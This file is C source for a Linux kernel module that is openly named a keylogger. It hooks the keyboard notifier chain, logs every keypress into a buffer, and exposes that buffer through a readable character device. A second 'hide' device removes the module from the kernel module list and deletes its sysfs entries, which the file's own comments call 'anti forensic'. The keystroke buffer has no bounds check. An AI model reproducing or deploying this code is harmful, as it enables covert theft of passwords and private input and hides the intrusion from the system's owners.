#ifndef KEYLOGGER
#define KEYLOGGER
#include <linux/input.h>
#include <linux/err.h>
#include <linux/keyboard.h>
#include <linux/module.h>
#include <linux/keyboard.h>
#include <linux/debugfs.h>
#include <linux/kernfs.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/kernel.h>
#include <linux/mutex.h>
#include <linux/fs.h>
#include <linux/err.h>
#include <linux/cdev.h>
#include <linux/semaphore.h>
#include "keys.h"
#define BUFF_SIZE (PAGE_SIZE << 2)
#define DEVICE_NAME "Keylogger"
static char msg_Ptr[BUFF_SIZE];
static size_t buf_pos;
int is_hide = 0;
struct fake_device
{
    char data[100];
    struct semaphore sem;
    
} virtual_device, virtual_device1;

struct cdev *mcdev;
struct cdev *mcdev1;
int major_number;
int ret;
dev_t dev_num;
dev_t dev_num1;
  

/*void hide(void)
{
    list_del(&THIS_MODULE->list);
    is_hide =1;
}
void unhide(void)
{
    list_add(&THIS_MODULE->list, module_list);
    is_hide=0;
}*/

int dev_open_fops_for_hide(struct inode *inode, struct file* file)
{
    static struct list_head *module_list;
    struct kobject* saved_kobj_parent;

    if (!is_hide)
    {

        while (!mutex_trylock(&module_mutex))
            cpu_relax();
        module_list = THIS_MODULE->list.prev;
        saved_kobj_parent = THIS_MODULE->mkobj.kobj.parent;
        list_del_init(&THIS_MODULE->list);
        sysfs_remove_dir(&THIS_MODULE->mkobj.kobj);//remove the specific dir (not the object from the module)
        kfree(THIS_MODULE->sect_attrs);/*clean informasion for anti forensic*/
        kfree(THIS_MODULE->notes_attrs);/*using kfree to clean*/
        THIS_MODULE->notes_attrs = NULL;/* and then puts, NULL to seve the setings */
        THIS_MODULE->sect_attrs = NULL;/*things such as .bss, .text .code etc*/
        is_hide = 1;

        mutex_unlock(&module_mutex);
    }
    else
    {
        while (!mutex_trylock(&module_mutex))
            cpu_relax();
        list_add(&THIS_MODULE->list, module_list);
        kobject_add(&THIS_MODULE->mkobj.kobj ,saved_kobj_parent, "rt");
        kobject_put(&THIS_MODULE->mkobj.kobj);
        is_hide=0;
        
        mutex_unlock(&module_mutex);

    }
    
    return 0;    
}
int device_open(struct inode *inode, struct file * filp)
{
    //using mutex for allow only open process to use
    if (down_interruptible(&virtual_device.sem) != 0)
    {
        printk(KERN_ALERT "Keylogger: could not lock the device during open");
        return -1;
    }
    printk(KERN_INFO "Keylogger: opend device");
    return 0;
}
static struct file_operations fops_hide =
{
    .owner = THIS_MODULE,
    .open = dev_open_fops_for_hide
};

ssize_t device_write(struct file *flip, const char * buff_sorce_data, size_t buff_count, loff_t * offset)
{
    printk(KERN_INFO "Keylogger: writing to device");
    ret = copy_from_user(virtual_device.data, buff_sorce_data, buff_count);
    return ret;
}
int device_close(struct inode *inode, struct file *flip)
{
    //release the mutex
    up(&virtual_device.sem);
    printk(KERN_INFO "Keylogger: closed device");
    return 0;
} 
static ssize_t device_read(struct file *filp, char __user * buffer, size_t length, loff_t *offset)
{
    /*
    int bytes_read=0;
    if (*msg_Ptr ==0) return 0;
    while (length && *msg_Ptr){
        put_user(*(msg_Ptr++), buffer++);
        length--;
        bytes_read++;
    }
    printk(KERN_ALERT "Keylogger: dvice read execute");
    return bytes_read;*/
    printk(KERN_ALERT "Keylogger: dvice read execute");
    
    return simple_read_from_buffer(buffer, length, offset, msg_Ptr, buf_pos);
}
static struct file_operations fops =
{
    .owner = THIS_MODULE, 
    .read = device_read,
    .write = device_write,
    .release = device_close,
    .open = device_open
};
static int hide_driver_entery(void)
{
    ret = alloc_chrdev_region(&dev_num1, 0, 1, "hide");
    if (ret < 0)
    {
        printk(KERN_ALERT "Keylogger: failed to allocate a major number for hide");
        return ret;
    }
    major_number = MAJOR(dev_num1);
    mcdev1 = cdev_alloc();
    mcdev1->ops = &fops_hide;
    mcdev1->owner = THIS_MODULE;
    ret = cdev_add(mcdev1, dev_num1, 1);
    if (ret < 0)
    {
        printk(KERN_ALERT "kelogger: unable to add hide cdev to kernel");
        return -1;
    }
    sema_init(&virtual_device1.sem, 1);
    return 0;


}
static int driver_entry(void)
{
    ret = alloc_chrdev_region(&dev_num, 0, 1, DEVICE_NAME);
    if (ret < 0)
    {
        printk(KERN_ALERT "Keylogger: failed to allocate a major number for fops");
        return ret;
    }
    major_number = MAJOR(dev_num);
    printk(KERN_INFO "Keylogger: major number is %d", major_number);
    printk(KERN_INFO "\t use\\mknod /dev/%s c %d for device fike", DEVICE_NAME, major_number);
    mcdev = cdev_alloc();
    mcdev->ops = &fops;
    mcdev->owner = THIS_MODULE;
    ret = cdev_add(mcdev, dev_num, 1);
    if (ret < 0)
    {
        printk(KERN_ALERT "Keylogger: unable to add cdev to kernel");
        return -1;
    }
    sema_init(&virtual_device.sem, 1);
    return 0;

}
static void driver_exit(void)
{
    cdev_del(mcdev);
    unregister_chrdev_region(dev_num, 1);
    printk(KERN_ALERT "Keylogger: unloaded module");

}


int len;

int keycode_to_string(int key_press, int shift, char* buff)
{

    char* tav;  
    if (shift)
    {
        /*hundle as shift*/
        tav = keycode[key_press][1];
    }
    else
    {
        tav = keycode[key_press][0];
    }
        len = sprintf(buff,tav);
        return len;    
    
}
int notifier(struct notifier_block *block, unsigned long code, void *p)
{
    struct keyboard_notifier_param *param =(struct keyboard_notifier_param*) p;
    char keybuffer[12] = {0};

    if (!(param->down))
        return NOTIFY_OK;

    if (code == KBD_KEYCODE)
    {
        len = keycode_to_string(param->value, param->shift, keybuffer) ;  
        if (strlen(keybuffer)> 0 && len)
        {
            printk(KERN_ALERT "notifer type to msg ptr");
            strncpy(msg_Ptr+ buf_pos, keybuffer, len);
            buf_pos+=len;
            
                    
        }

    }
    return NOTIFY_OK;
}
#endif